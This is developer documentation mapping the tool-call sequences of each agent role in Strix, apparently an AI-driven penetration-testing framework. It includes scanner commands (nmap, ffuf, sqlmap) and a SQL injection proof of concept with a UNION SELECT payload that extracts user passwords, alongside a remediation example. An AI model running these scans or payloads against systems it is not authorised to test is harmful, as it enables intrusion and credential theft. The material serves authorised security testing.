# Strix Agent Tool-Call Map

A reference for **which tool calls each agent role uses, in what sequence, for which workflow**. Use this alongside [orchestration-logic.md](orchestration-logic.md) (the strategy) and [ToolCall.md](ToolCall.md) (the transport).

> **TL;DR.** Agents are not typed in code — every agent is a `StrixAgent`. Their *role* is implicit, defined by the task string and the loaded skills. But the prompts encode strict tool-call patterns per role: a Root Agent should never call `terminal_execute`, a Reporting Agent should call `create_vulnerability_report` exactly once, a Fixing Agent should call `str_replace_editor` and re-validate. This document lists the registered tool inventory and maps each role to its expected tool-call pattern.

---

## Table of Contents

1. [Complete Tool Inventory](#1-complete-tool-inventory)
2. [Tool Categories at a Glance](#2-tool-categories-at-a-glance)
3. [Role × Tool Matrix](#3-role--tool-matrix)
4. [Workflow 1 — Root Agent (Orchestrator)](#4-workflow-1--root-agent-orchestrator)
5. [Workflow 2 — Black-Box Reconnaissance Agent](#5-workflow-2--black-box-reconnaissance-agent)
6. [Workflow 3 — White-Box Source Triage Agent](#6-workflow-3--white-box-source-triage-agent)
7. [Workflow 4 — Component / Surface Agent](#7-workflow-4--component--surface-agent)
8. [Workflow 5 — Vulnerability Discovery Agent](#8-workflow-5--vulnerability-discovery-agent)
9. [Workflow 6 — Validation Agent](#9-workflow-6--validation-agent)
10. [Workflow 7 — Reporting Agent](#10-workflow-7--reporting-agent)
11. [Workflow 8 — Fixing Agent (white-box only)](#11-workflow-8--fixing-agent-white-box-only)
12. [Cross-Cutting Tools (every agent)](#12-cross-cutting-tools-every-agent)

---

## 1. Complete Tool Inventory

Every tool registered with `@register_tool` in the codebase, grouped by module:

### Agent graph (host-only, `sandbox_execution=False`)
| Tool | Purpose |
|---|---|
| `create_agent(task, name, skills, inherit_context)` | Spawn a sub-agent in a new thread |
| `send_message_to_agent(target_agent_id, message, message_type, priority)` | Post to another agent's inbox |
| `wait_for_message(reason)` | Enter `waiting` status until a message arrives or timeout |
| `agent_finish(result_summary, findings, success, report_to_parent, final_recommendations)` | Close a sub-agent and post a structured completion report to parent |
| `view_agent_graph()` | Render the current agent tree with statuses |

### Finish (host-only)
| Tool | Purpose |
|---|---|
| `finish_scan(scan_summary, vulnerability_count, scan_completed)` | Root-only — terminate the whole scan |

### Reporting (host-only)
| Tool | Purpose |
|---|---|
| `create_vulnerability_report(title, severity, cvss_vector, target, endpoint, method, technical_analysis, poc_description, poc_steps, evidence, impact, fix_recommendations, affected_files, code_diff, ...)` | Commit a validated finding (gated by LLM dedupe) |

### Notes (host-only)
| Tool | Purpose |
|---|---|
| `create_note(title, content, category, tags)` | Create a freeform or wiki note |
| `list_notes(category)` | List notes (typically `category="wiki"` for repo memory) |
| `get_note(note_id)` | Read a note in full |
| `update_note(note_id, content, ...)` | Replace note body |
| `delete_note(note_id)` | Remove a note |

### Todo (host-only)
| Tool | Purpose |
|---|---|
| `create_todo(title, description, priority)` | Add a TODO item |
| `list_todos(status)` | List TODOs |
| `update_todo(todo_id, ...)` | Edit a TODO |
| `mark_todo_done(todo_id)` | Complete a TODO |
| `mark_todo_pending(todo_id)` | Re-open a TODO |
| `delete_todo(todo_id)` | Remove |

### Skill loading & reasoning (host-only)
| Tool | Purpose |
|---|---|
| `load_skill(skills)` | Add up to 5 skill playbooks to the current agent's system prompt |
| `think(thought)` | Structured scratchpad for reasoning |

### Web search (host-only, `requires_web_search_mode=True`)
| Tool | Purpose |
|---|---|
| `web_search(query)` | Perplexity AI lookup for fresh CVEs / payloads / techniques |

### Sandbox tools (forwarded to the container's tool server)

#### Terminal
| Tool | Purpose |
|---|---|
| `terminal_execute(command, is_input, timeout, terminal_id, no_enter)` | Run shell commands in a per-agent tmux pane (this is how `nmap`, `sqlmap`, `nuclei`, `ffuf`, `httpx`, `subfinder`, `naabu`, `katana`, `semgrep`, `bandit`, `trufflehog`, `gitleaks`, `trivy`, `zaproxy`, `wapiti`, `arjun`, `dirsearch`, `wafw00f`, `jwt_tool` are invoked) |

#### Python
| Tool | Purpose |
|---|---|
| `python_action(action, …)` | Drive an IPython kernel. Sub-actions: `new_session`, `execute`, `close`, `list_sessions` |

#### Browser (omitted when `STRIX_DISABLE_BROWSER=true`)
| Tool | Purpose |
|---|---|
| `browser_action(action, …)` | Drive Playwright Chromium. 21 sub-actions: `launch`, `goto`, `click`, `type`, `scroll_down`, `scroll_up`, `back`, `forward`, `new_tab`, `switch_tab`, `close_tab`, `wait`, `execute_js`, `double_click`, `hover`, `press_key`, `save_pdf`, `get_console_logs`, `view_source`, `close`, `list_tabs` |

#### Proxy (Caido)
| Tool | Purpose |
|---|---|
| `list_requests(filter…)` | List intercepted HTTP traffic |
| `view_request(request_id)` | Read full request/response |
| `send_request(method, url, headers, body)` | Send a fresh HTTP request through the proxy |
| `repeat_request(request_id, modifications…)` | Replay/modify an intercepted request |
| `scope_rules(...)` | Configure capture scope |
| `list_sitemap()` | Show the discovered sitemap |
| `view_sitemap_entry(path)` | Inspect a sitemap node |

#### File editing
| Tool | Purpose |
|---|---|
| `str_replace_editor(command, path, …)` | View / create / edit / undo file changes inside `/workspace` |
| `list_files(path, recursive)` | List directory contents |
| `search_files(pattern, path, …)` | Ripgrep across the workspace |

---

## 2. Tool Categories at a Glance

```
┌─────────────────────────────────────────────────────────────────────────────┐
│   ORCHESTRATION                CONTEXT                  EXECUTION           │
│  (host-only)                  (host-only)              (sandbox)            │
│                                                                              │
│  create_agent                 think                     terminal_execute     │
│  send_message_to_agent        load_skill                python_action        │
│  wait_for_message             create_note               browser_action       │
│  view_agent_graph             list_notes                list_requests        │
│  agent_finish                 get_note                  view_request         │
│  finish_scan                  update_note               send_request         │
│                               delete_note               repeat_request       │
│                               create_todo               scope_rules          │
│                               list_todos                list_sitemap         │
│                               update_todo               view_sitemap_entry   │
│                               mark_todo_done            str_replace_editor   │
│                               mark_todo_pending         list_files           │
│                               delete_todo               search_files         │
│                               web_search                                     │
│                                                                              │
│   COMMITMENT                                                                 │
│  (host-only, gated)                                                          │
│                                                                              │
│  create_vulnerability_report  ← only Reporting Agents                        │
└─────────────────────────────────────────────────────────────────────────────┘
```

The base prompt encodes strict per-role gating:

- **Only the root** can call `finish_scan`.
- **Only Reporting Agents** can call `create_vulnerability_report`.
- **Sub-agents** must use `agent_finish`, never `finish_scan`.
- The root **should not** call `terminal_execute`/`python_execute`/`browser_action` for substantive testing — that's what sub-agents are for.

---

## 3. Role × Tool Matrix

Legend: ✅ = primary tool, 🔸 = used occasionally, ❌ = forbidden by prompt, — = N/A.

| Tool | Root | Recon (BB) | Source Triage (WB) | Component | Discovery | Validation | Reporting | Fixing (WB) |
|---|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| `create_agent` | ✅ | 🔸 | 🔸 | ✅ | ✅ | ✅ | — | — |
| `send_message_to_agent` | 🔸 | 🔸 | 🔸 | 🔸 | 🔸 | 🔸 | — | — |
| `wait_for_message` | ✅ | 🔸 | 🔸 | ✅ | 🔸 | 🔸 | — | — |
| `view_agent_graph` | ✅ | — | — | 🔸 | — | — | — | — |
| `agent_finish` | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| `finish_scan` | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| `create_vulnerability_report` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ |
| `think` | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| `load_skill` | 🔸 | ✅ | ✅ | ✅ | ✅ | ✅ | 🔸 | ✅ |
| `web_search` | 🔸 | ✅ | 🔸 | ✅ | ✅ | ✅ | — | 🔸 |
| `create_note` / `update_note` (wiki) | ✅ | — | ✅ | ✅ | ✅ | 🔸 | 🔸 | 🔸 |
| `list_notes` / `get_note` | ✅ | — | ✅ | ✅ | ✅ | ✅ | 🔸 | ✅ |
| `create_todo` / `mark_todo_*` | ✅ | — | 🔸 | 🔸 | — | — | — | — |
| `terminal_execute` | ❌ | ✅ | ✅ | ✅ | ✅ | ✅ | — | ✅ |
| `python_action` | ❌ | 🔸 | 🔸 | ✅ | ✅ | ✅ | — | 🔸 |
| `browser_action` | ❌ | ✅ | — | ✅ | ✅ | ✅ | — | — |
| `list_requests` / `view_request` / `repeat_request` / `send_request` | ❌ | ✅ | — | ✅ | ✅ | ✅ | 🔸 | — |
| `str_replace_editor` | ❌ | — | 🔸 | 🔸 | 🔸 | 🔸 | — | ✅ |
| `list_files` / `search_files` | — | — | ✅ | ✅ | ✅ | 🔸 | — | ✅ |

---

## 4. Workflow 1 — Root Agent (Orchestrator)

**Identity.** First `StrixAgent` of the scan. `parent_id=None`. Skills: `root_agent` + `scan_modes/<mode>` + (white-box only) `coordination/source_aware_whitebox` + `custom/source_aware_sast`.

**Job.** Plan, decompose, delegate, monitor, aggregate, finish. Per the base prompt: *"avoid spending its own iterations on detailed testing"*.

### Typical tool-call sequence

```
think                              # plan target decomposition
↓
list_notes(category="wiki")        # white-box: check for prior repo wiki
get_note(note_id=...)              # white-box: read it
create_note(category="wiki",       # white-box: or create a fresh one
  title="<repo> Wiki",
  tags=["repo:<name>"])
↓
create_todo(...)                   # build the testing roadmap
create_todo(...)
create_todo(...)
↓
create_agent(name="Auth Agent",          # spawn first wave of component agents
  task="...", skills="authentication_jwt,business_logic")
create_agent(name="API IDOR Agent",
  task="...", skills="idor")
create_agent(name="Search SQLi Agent",
  task="...", skills="sql_injection")
create_agent(name="Payment Logic Agent",
  task="...", skills="business_logic,race_conditions")
↓
wait_for_message(reason="children testing")
↓                                   # children stream completion reports back
think                               # process completion reports
mark_todo_done(...)
view_agent_graph                    # confirm topology
↓
create_agent(...)                   # spawn more agents reactively as findings emerge
↓
wait_for_message(...)
↓
... (loop until all branches converge) ...
↓
update_note(note_id=...,            # final wiki update with scanner summary
  content="...consolidated...")
↓
finish_scan(                        # exit
  scan_summary="...",
  vulnerability_count=N,
  scan_completed=True)
```

### What the root must NOT call

- `terminal_execute` / `python_action` / `browser_action` for substantive testing (lightweight verification is allowed when needed to unblock delegation).
- `create_vulnerability_report` — gated to Reporting Agents only.
- `agent_finish` — that's for sub-agents. Root uses `finish_scan`.

---

## 5. Workflow 2 — Black-Box Reconnaissance Agent

**Identity.** Sub-agent spawned by root early in a black-box scan. Skills: typically just `scan_modes/<mode>` (no vuln-specific skill — it's mapping, not exploiting).

**Job.** Subdomain enumeration, port scanning, content discovery, technology fingerprinting. Output: an enumerated attack-surface map appended to the parent's context via `agent_finish`.

### Typical tool-call sequence

```
think                              # plan recon waves
load_skill(skills="subfinder,httpx,naabu,katana,nmap,nuclei")
↓
terminal_execute(                  # subdomain enumeration
  command="subfinder -d example.com -all -recursive -o subs.txt")
terminal_execute(
  command="cat subs.txt | httpx -title -tech-detect -status-code -o live.txt")
↓
terminal_execute(                  # port scanning
  command="naabu -list live.txt -top-ports 1000 -o ports.txt")
terminal_execute(
  command="nmap -sV -p- -iL critical-hosts.txt -oA nmap-svc")
↓
terminal_execute(                  # content discovery
  command="katana -list live.txt -d 5 -jc -o crawl.txt")
terminal_execute(
  command="ffuf -u https://app.example.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403")
↓
browser_action(action="goto",       # human-style traversal of key pages
  url="https://app.example.com/login")
browser_action(action="view_source")
↓
list_requests                       # pull every captured HTTP exchange
view_request(request_id="...")      # inspect interesting ones
list_sitemap                        # auto-built sitemap from proxy
↓
terminal_execute(                   # baseline vulnerability scan (advisory only)
  command="nuclei -list live.txt -severity critical,high -o nuclei.txt")
↓
think                               # synthesize findings into a brief
↓
agent_finish(
  success=True,
  result_summary="Mapped 23 subdomains, 47 endpoints, identified Next.js + Postgres + Redis stack...",
  findings=["3 high-confidence SQLi candidates in /api/search", "JWT used for auth, HS256", ...],
  final_recommendations=["spawn SQLi-Discovery on /api/search", "spawn JWT-Discovery on auth"])
```

The recon agent **doesn't report vulnerabilities** — it produces hypotheses. Reporting only happens after a full Discovery → Validation → Reporting pipeline.

---

## 6. Workflow 3 — White-Box Source Triage Agent

**Identity.** Sub-agent on a white-box scan, spawned to do the four mandated source-aware passes. Skills: `custom/source_aware_sast`, `tooling/semgrep`, `tooling/gitleaks`.

**Job.** Run `semgrep` + AST + secrets + `trivy fs`, build the repo wiki, surface high-risk paths, hand off to component agents.

### Typical tool-call sequence

```
think
load_skill(skills="source_aware_sast,semgrep,gitleaks")
↓
list_notes(category="wiki")        # check for existing wiki
get_note(note_id=...)              # read if found, otherwise:
↓
list_files(path="/workspace/<repo>", recursive=True)
search_files(pattern="def\\s+(login|authenticate)", path="/workspace/<repo>")
↓
terminal_execute(                  # static-pass 1: semgrep
  command="cd /workspace/<repo> && semgrep --config=auto --json -o semgrep.json .")
↓
terminal_execute(                  # static-pass 2: derive AST targets from semgrep
  command="jq -r '.paths.scanned[]' semgrep.json > sg-targets.txt")
terminal_execute(
  command="cat sg-targets.txt | xargs sg run --pattern 'requests.get($X)'")
↓
terminal_execute(                  # static-pass 3a: secrets (working tree)
  command="cd /workspace/<repo> && gitleaks detect --no-banner --report-path gitleaks.json")
terminal_execute(                  # static-pass 3b: secrets (history)
  command="cd /workspace/<repo> && trufflehog filesystem . --json > trufflehog.json")
↓
terminal_execute(                  # static-pass 4: dependencies + IaC
  command="cd /workspace/<repo> && trivy fs --format json -o trivy.json .")
↓
str_replace_editor(                # read flagged files in detail
  command="view",
  path="/workspace/<repo>/api/users.py")
↓
think                              # synthesize routes/sinks/auth model
↓
update_note(                       # commit the structured wiki
  note_id="<wiki-id>",
  content="""
## Architecture
...
## Entrypoints and routing
...
## AuthN/AuthZ model
...
## High-risk sinks and trust boundaries
- api/users.py:34 — raw SQL string concat
- api/upload.py:78 — path join with user input
...
## Static scanner summary
- semgrep: 12 high, 8 medium
- gitleaks: 1 AWS key in test fixtures (skip)
- trivy: 3 CVEs in dependencies
## Dynamic validation follow-ups
- Spawn SQLi-Discovery on api/users.search
- Spawn LFI-Discovery on api/upload.process
""")
↓
agent_finish(
  success=True,
  result_summary="Source triage complete. 4 high-risk dynamic validation candidates identified.",
  findings=[...],
  final_recommendations=["spawn SQLi-Discovery on api/users.search", ...])
```

---

## 7. Workflow 4 — Component / Surface Agent

**Identity.** Mid-tier sub-agent owning one component (auth, payments, admin, search). Skills: 1–3 skills relevant to that component.

**Job.** Test the component for the relevant vulnerability classes. **May fan out** Discovery agents per finding — its main responsibility is coverage of that surface.

### Typical tool-call sequence

```
think
load_skill(skills="authentication_jwt,business_logic")  # component-specific
↓
get_note(note_id=...)              # white-box: read the wiki for this component's notes
↓
browser_action(action="goto",      # explore the component
  url="https://app.example.com/login")
list_requests(filter="login")
view_request(request_id="...")
↓
python_action(action="new_session")
python_action(                     # exploratory testing
  action="execute",
  code="import jwt, requests; ...")
↓
terminal_execute(                  # automated tooling on this surface
  command="jwt_tool 'eyJhbG...' -X p")    # play with the JWT
↓
think                              # found something interesting?
↓
create_agent(name="JWT-Secret-Brute Discovery",
  task="...", skills="authentication_jwt")
create_agent(name="OAuth-Redirect Discovery",
  task="...", skills="authentication_jwt")
↓
wait_for_message(reason="discovery agents working")
↓
... (children report back) ...
↓
agent_finish(
  success=True,
  result_summary="Auth component reviewed; JWT-Secret-Brute found a guessable secret (followed up).",
  findings=["JWT HS256 with short secret", "OAuth state reuse possible"])
```

---

## 8. Workflow 5 — Vulnerability Discovery Agent

**Identity.** Specialist sub-agent spawned by a component agent. Skills: 1 specific vulnerability skill (e.g. `sql_injection`).

**Job.** Confirm a single hypothesis is worth chasing. Either **spawn a Validation Agent** or `agent_finish` with `success=False`/empty findings.

### Typical tool-call sequence

```
think
load_skill(skills="sql_injection")
↓
list_requests(filter="search")
view_request(request_id="...")
↓
python_action(                     # generate a payload corpus
  action="execute",
  code="import itertools; payloads = [...]")
↓
terminal_execute(                  # spray
  command="ffuf -u 'https://app/api/search?q=FUZZ' -w sqli-payloads.txt -mr 'syntax error'")
↓
terminal_execute(                  # automated SQLi confirmation
  command="sqlmap -u 'https://app/api/search?q=test' --batch --level=3 --risk=2")
↓
think                              # promising? then delegate validation
↓
create_agent(name="SQLi-Validation (api/search)",
  task="...", skills="sql_injection")
↓
wait_for_message
↓
agent_finish(
  success=True,
  result_summary="SQLi candidate confirmed in /api/search 'q' param; validation spawned.")
```

---

## 9. Workflow 6 — Validation Agent

**Identity.** Spawned by a Discovery Agent to **prove exploitability**. Skills: same vuln skill as discovery.

**Job.** Build a reliable PoC. If it works → spawn a Reporting Agent. If false-positive → `agent_finish(success=False)`.

### Typical tool-call sequence

```
think
load_skill(skills="sql_injection")
↓
get_note(note_id=...)              # white-box: cross-reference source
str_replace_editor(                # confirm the sink
  command="view", path="/workspace/<repo>/api/search.py")
↓
python_action(                     # craft the exact PoC
  action="execute",
  code="""
import requests
url = 'https://app.example.com/api/search'
payload = "test' UNION SELECT username,password FROM users -- "
r = requests.get(url, params={'q': payload})
assert 'admin@' in r.text
print('exploited')
""")
↓
repeat_request(                    # replay the working request through proxy
  request_id="...",
  modifications={"q": payload})
↓
think                              # verify reproducibility
python_action(                     # multi-run reliability check
  action="execute",
  code="for _ in range(5): assert run_poc()")
↓
create_agent(name="SQLi-Reporting (api/search)",
  task="...", skills="sql_injection")
↓
wait_for_message
↓
agent_finish(
  success=True,
  result_summary="SQLi confirmed; UNION-based extraction works reliably; Reporting Agent dispatched.",
  findings=["data exfiltration via /api/search?q=..."])
```

If validation fails:

```
python_action(action="execute", ...)   # repeated attempts
think
agent_finish(
  success=False,                    # explicitly NOT successful
  result_summary="Initial SQLi hypothesis invalidated — endpoint uses parameterized query.",
  findings=[])
```

The "validation failed" path is **explicitly normalized as a healthy outcome** in the prompt — false positives are caught here, before the reporting boundary.

---

## 10. Workflow 7 — Reporting Agent

**Identity.** Spawned by a successful Validation Agent. Skills: same vuln skill (for terminology and remediation guidance).

**Job.** Make **one** call to `create_vulnerability_report` with full evidence, then `agent_finish`. This is the only role allowed to commit a finding.

### Typical tool-call sequence

```
think                              # compose the writeup
load_skill(skills="sql_injection") # for accurate remediation language
↓
view_request(request_id="...")     # pull final PoC evidence from proxy
↓
create_vulnerability_report(
  title="Authenticated SQL Injection in /api/search 'q' parameter",
  severity="critical",
  cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
  target="https://app.example.com",
  endpoint="/api/search",
  method="GET",
  technical_analysis="The 'q' parameter is concatenated into a SQL query without parameterization. Tested with UNION-based extraction at api/search.py line 34 (sink confirmed via source review).",
  poc_description="Send a UNION-based payload to extract user credentials.",
  poc_steps="""
1. Authenticate as any user.
2. GET /api/search?q=test'+UNION+SELECT+username,password+FROM+users--+
3. Response body contains all user credentials.
""",
  evidence="<full request/response pair>",
  impact="Full credential database extraction; lateral movement to admin accounts.",
  fix_recommendations="Use parameterized queries (psycopg2 cursor.execute with parameter tuple). Validate that 'q' matches expected pattern.",
  affected_files=["api/search.py"])
↓                                  # tool returns: accepted OR rejected as duplicate
                                   # if rejected — accept and move on (per prompt rules)
↓
agent_finish(
  success=True,                    # report committed (or dedup-rejected, both fine)
  result_summary="SQLi vulnerability report committed (vuln-0042).",
  findings=["vuln-0042"])
```

**Strict rules from the base prompt:**

- *"A vulnerability is **ONLY** considered reported when a reporting agent uses `create_vulnerability_report` with full details. Mentions in `agent_finish`, `finish_scan`, or generic messages are NOT sufficient."*
- *"If `create_vulnerability_report` rejects your report as a duplicate, **DO NOT attempt to re-submit**."*

---

## 11. Workflow 8 — Fixing Agent (white-box only)

**Identity.** Spawned after a successful Reporting Agent in white-box scans. Skills: same vuln skill.

**Job.** Edit source to remove the vulnerability, re-run the PoC, confirm the fix, append a code diff to the report.

### Typical tool-call sequence

```
think
load_skill(skills="sql_injection")
↓
get_note(note_id=...)              # read wiki for current arch
str_replace_editor(                # read the vulnerable code
  command="view", path="/workspace/<repo>/api/search.py")
↓
search_files(pattern="def search", path="/workspace/<repo>")
↓
str_replace_editor(                # apply the fix
  command="str_replace",
  path="/workspace/<repo>/api/search.py",
  old_str="cursor.execute(f\"SELECT * FROM items WHERE name LIKE '%{q}%'\")",
  new_str="cursor.execute(\"SELECT * FROM items WHERE name LIKE %s\", ('%' + q + '%',))")
↓
terminal_execute(                  # run unit tests if any
  command="cd /workspace/<repo> && pytest tests/test_search.py -v")
terminal_execute(                  # restart the local app
  command="cd /workspace/<repo> && pkill -f 'uvicorn' ; uvicorn main:app --port 8000 &")
↓
python_action(                     # re-run the PoC against the patched build
  action="execute",
  code="""
import requests
r = requests.get('http://localhost:8000/api/search', params={'q': "test' UNION..."})
assert 'admin@' not in r.text     # fix confirmed
assert r.status_code == 200       # not a regression
""")
↓
think                              # verify no behavior regression
↓
update_note(                       # append fix to wiki
  note_id="<wiki-id>",
  content="...search.py fixed at <commit>; PoC no longer succeeds; tests pass...")
↓
agent_finish(
  success=True,
  result_summary="SQLi in api/search.py fixed via parameterized query. PoC fails post-patch; tests green.",
  findings=["fix applied: api/search.py +1 -1"],
  final_recommendations=["consider repo-wide grep for similar string-concat patterns"])
```

The diff lives only inside the container — to land it in the user's working tree, the user has to extract it from `strix_runs/<run-name>/`. CLI autofix is on the [roadmap §17](roadmap.md).

---

## 12. Cross-Cutting Tools (every agent)

These appear in **every** role's tool stream:

| Tool | Why every agent uses it |
|---|---|
| `think(thought)` | The base prompt mandates calling `think` for any non-trivial reasoning rather than emitting plain text. |
| `wait_for_message(reason)` | Any agent that has spawned children or finished a phase must wait rather than emit empty messages — empty assistant content triggers the loop's corrective injection. |
| `agent_finish(...)` | Sub-agents — the only valid way to terminate. The root uses `finish_scan` instead. |
| `load_skill(skills)` | Any agent can dynamically pull additional vuln/protocol/tooling guidance into its system prompt at runtime. |

### What every agent must NOT do

- Emit a non-tool-call message in non-interactive mode (the base prompt: *"While the agent loop is running, almost every output MUST be a tool call"*).
- Output more than one tool call per message (only the first `<function=…></function>` block is parsed; `_truncate_to_first_function` enforces this).
- Wrap tool calls in markdown code fences, JSON, or `<thinking>` tags.

---

## See Also

- [orchestration-logic.md](orchestration-logic.md) — the *strategy* this document references (when to spawn, how to converge, which workflow to apply).
- [multiagent.md](multiagent.md) — the *mechanism* (loops, threads, memory, lifecycle).
- [ToolCall.md](ToolCall.md) — the transport layer (how `<function=…>` becomes an HTTP call into the sandbox).
- [feature.md](feature.md) — high-level feature reference.
- [strix/agents/StrixAgent/system_prompt.jinja](https://github.com/usestrix/strix/blob/main/strix/agents/StrixAgent/system_prompt.jinja) — the base prompt that gates tool usage per role.
- [strix/skills/coordination/root_agent.md](https://github.com/usestrix/strix/blob/main/strix/skills/coordination/root_agent.md) — the orchestrator skill.
